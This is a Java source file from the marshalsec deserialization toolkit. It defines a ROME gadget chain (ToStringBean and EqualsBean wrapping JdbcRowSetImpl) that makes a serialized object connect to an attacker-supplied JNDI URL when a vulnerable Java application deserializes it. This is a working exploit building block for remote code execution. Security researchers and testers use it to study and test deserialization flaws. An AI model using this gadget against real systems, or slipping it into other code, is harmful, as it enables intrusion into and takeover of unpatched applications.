/* MIT License

Copyright (c) 2017 Moritz Bechler

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
package marshalsec.gadgets;


import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;

import marshalsec.MarshallerBase;
import marshalsec.UtilFactory;


/**
 * @author mbechler
 *
 */
public interface Rome extends Gadget {

    @Primary
    @Args ( minArgs = 1, args = {
        "jndiUrl"
    }, defaultArgs = {
        MarshallerBase.defaultJNDIUrl
    } )
    default Object makeRome ( UtilFactory uf, String[] args ) throws Exception {
        return makeROMEAllPropertyTrigger(uf, JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(args[ 0 ]));
    }


    default <T> Object makeROMEAllPropertyTrigger ( UtilFactory uf, Class<T> type, T obj ) throws Exception {
        ToStringBean item = new ToStringBean(type, obj);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);
        return uf.makeHashCodeTrigger(root);
    }
}
